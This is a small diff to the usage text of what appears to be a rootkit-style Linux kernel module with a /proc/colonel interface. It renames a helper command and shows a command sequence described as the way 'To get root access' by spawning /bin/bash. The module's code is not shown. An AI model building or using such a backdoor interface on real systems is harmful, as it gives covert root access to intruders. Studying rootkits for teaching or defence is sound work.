@@ -143,7 +143,7 @@ static int read_colonel(char *buffer, char **buffer_location, off_t off, int cou
 USAGE:\n\
   From command line --\n\
   $ echo -n <command> >> /proc/colonel\n\n\
-  From colcmd --\n\
+  From rtcmd --\n\
   $ sudo ./rtcmd <command>\n\n\
   To get root access --\n\
   $ sudo ./rtcmd hackbright /bin/bash\n\n\
